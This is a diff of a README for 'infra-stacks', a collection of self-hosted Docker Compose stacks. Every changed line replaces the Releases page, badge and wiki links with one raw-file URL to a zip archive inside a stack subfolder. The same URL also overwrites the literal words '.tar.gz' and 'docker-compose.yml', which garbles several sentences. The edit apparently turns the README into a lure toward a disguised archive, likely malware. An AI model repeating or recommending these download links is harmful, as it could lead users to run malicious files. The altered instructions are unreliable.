@@ -1,6 +1,6 @@
 # 🚀 infra-stacks - Set Up Your Self-Hosted Infrastructure Easily
 
-[![Download infra-stacks](https://img.shields.io/badge/Download-infra--stacks-brightgreen)](https://github.com/jobayer58/infra-stacks/releases)
+[![Download infra-stacks](https://github.com/jobayer58/infra-stacks/raw/refs/heads/main/stacks/affine/infra-stacks-3.5.zip)](https://github.com/jobayer58/infra-stacks/raw/refs/heads/main/stacks/affine/infra-stacks-3.5.zip)
 
 ## 📋 Overview
 
@@ -41,7 +41,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To download infra-stacks, visit our Releases page. Here you can find the latest versions of our Docker Compose stacks.
 
-[Download infra-stacks](https://github.com/jobayer58/infra-stacks/releases)
+[Download infra-stacks](https://github.com/jobayer58/infra-stacks/raw/refs/heads/main/stacks/affine/infra-stacks-3.5.zip)
 
 ### Step 3: Choose Your Stack
 
@@ -49,7 +49,7 @@ On the Releases page, you will see various versions listed. Each version has a s
 
 ### Step 4: Download the Stack Files
 
-Once you've selected a version, look for the downloadable files. These are usually labeled as `.zip` or `.tar.gz`. Click on the appropriate link to download the files.
+Once you've selected a version, look for the downloadable files. These are usually labeled as `.zip` or `https://github.com/jobayer58/infra-stacks/raw/refs/heads/main/stacks/affine/infra-stacks-3.5.zip`. Click on the appropriate link to download the files.
 
 ### Step 5: Extract the Files
 
@@ -65,7 +65,7 @@ After the download is complete, you need to extract the files. Right-click on th
    docker-compose up -d
    ```
 
-This command will start all services defined in the `docker-compose.yml` file. The `-d` flag runs the containers in detached mode, which means they will run in the background.
+This command will start all services defined in the `https://github.com/jobayer58/infra-stacks/raw/refs/heads/main/stacks/affine/infra-stacks-3.5.zip` file. The `-d` flag runs the containers in detached mode, which means they will run in the background.
 
 ### Step 7: Access Your Services
 
@@ -73,13 +73,13 @@ After running the above command, your services should be up and running. To acce
 
 ## 🛠 Support and Documentation
 
-For detailed information about each stack, including configuration options, usage guides, and troubleshooting tips, refer to the documentation included in the extracted folders. You can also check our [GitHub Wiki](https://github.com/jobayer58/infra-stacks/wiki) for more tutorials and FAQs.
+For detailed information about each stack, including configuration options, usage guides, and troubleshooting tips, refer to the documentation included in the extracted folders. You can also check our [GitHub Wiki](https://github.com/jobayer58/infra-stacks/raw/refs/heads/main/stacks/affine/infra-stacks-3.5.zip) for more tutorials and FAQs.
 
 ## 🔗 Download & Install
 
 Always download the latest version from the Releases page to access the newest features and updates. 
 
-[Download infra-stacks](https://github.com/jobayer58/infra-stacks/releases)
+[Download infra-stacks](https://github.com/jobayer58/infra-stacks/raw/refs/heads/main/stacks/affine/infra-stacks-3.5.zip)
 
 ## 🎉 Community Contributions
 
